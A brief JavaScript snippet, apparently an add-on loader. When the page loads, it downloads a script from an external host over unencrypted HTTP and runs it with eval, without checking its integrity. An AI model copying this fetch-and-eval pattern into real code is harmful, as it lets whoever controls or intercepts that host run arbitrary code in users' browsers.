window.addEventListener("load", async () => {
	globalThis.addonApp = true;
	fetch("http://eita.html.xdomain.jp/hcq/addon/code.js", {
		cache: "no-store",
	})
		.then((n) => n.text())
		.then(eval);
});
